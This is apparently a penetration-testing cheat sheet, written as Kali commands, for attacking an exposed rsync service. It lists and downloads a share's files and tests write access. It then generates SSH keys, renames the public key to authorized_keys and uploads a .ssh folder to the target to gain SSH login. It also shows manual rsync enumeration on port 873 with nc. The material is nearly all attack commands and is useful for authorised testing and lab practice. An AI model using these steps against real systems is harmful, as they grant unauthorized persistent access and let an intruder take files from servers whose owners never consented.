
#### SSH key upload

```bash - kali
rsync rsync://$TARGET
```

```bash - kali
rsync rsync://$TARGET/$FOLDER
```

Download share with it's contents:
```bash - kali
rsync -av rsync://$TARGET/$FOLDER ./rsyncfiles
```

Test to see if we can upload files:

```bash - kali
echo "test" > test
```

```bash - kali
rsync -av test.txt rsync://$TARGET/$FOLDER
```

```bash - kali
rsync -av --list-only rsync://$TARGET/$FOLDER
```

Next, we'll create ssh keys and upload so we can ssh into target:

```bash - kali
ssh-keygen
```

```bash - kali
cp /home/kali/.ssh/id_rsa* .
```

```bash - kali
mkdir .ssh && mv id_rsa* .ssh
```

Change the public key to authorized_keys

```bash - kali
mv id_rsa.pub authorized_keys
```

Transfer the key files to the target like so:
```bash - kali
rsync -a --relative ./.ssh  rsync://$TARGET/$FOLDER/
```

```bash - kali
ssh $USER@$TARGET
```

---

#### nc enumeration

```bash - kali
nc -nvv $TARGET 873
```

```bash - kali
@RSYNCD: 31.0  
```

```bash - kali
#list
```


Now lets try to enumerate

```bash - kali
nc -nvv $TARGET 873
```

```bash - kali
@RSYNCD: 31.0  
```

```bash - kali
$FOLDER
```

`@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g`    <--- This means you need the password